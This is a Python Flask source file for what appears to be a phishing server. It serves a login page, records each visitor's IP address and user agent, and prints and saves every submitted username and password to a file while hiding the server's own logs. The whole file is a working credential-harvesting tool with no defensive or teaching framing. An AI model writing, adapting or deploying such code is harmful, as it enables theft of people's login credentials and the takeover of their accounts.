from flask import Flask, render_template, request
from src.file import Files
from gevent.pywsgi import WSGIServer
from src.hide_logs import DevNull


app = Flask(__name__)


@app.route('/', methods=["GET", "POST"])
def main():
    user = request.form.get("username")
    password = request.form.get("password")

    if request.method == "GET":
        if request.environ['REMOTE_ADDR']:
            print()
            print('SOMEONE CAME IN!')
            print(request.environ['REMOTE_ADDR'])
            print(request.headers.get('User-agent'))
            print()

        return render_template('login.html')
    else:
        if len(request.form.get("username").replace(' ', '')) == 0:
            user = 'EMPTY-USERNAME'
        if len(request.form.get("password").replace(' ', '')) == 0:
            password = 'EMPTY-PASSWORD'

        if len(request.form.get("username").replace(' ', '')) and len(request.form.get("password").replace(' ', '')):
            print(f'DATA FROM {request.environ["REMOTE_ADDR"]}')
            print(f'USERNAME: {user}')
            print(f'PASSWORD: {password}')
        else:
            print('USER ENTERED EMPTY DATA')

        print()

        Files.create_file(user, password, request.environ['REMOTE_ADDR'], request.headers.get('User-agent'))
        return render_template('login.html', user=user, password=password)


if __name__ == '__main__':
    HOST = '127.0.0.1'
    port = int(input('PORT: '))

    print()
    print('RUNNING...')
    print(f'http://{HOST}:{port}')
    print(f'https://{HOST}:{port}')

    server = WSGIServer((HOST, port), app, log=DevNull)
    server.serve_forever()
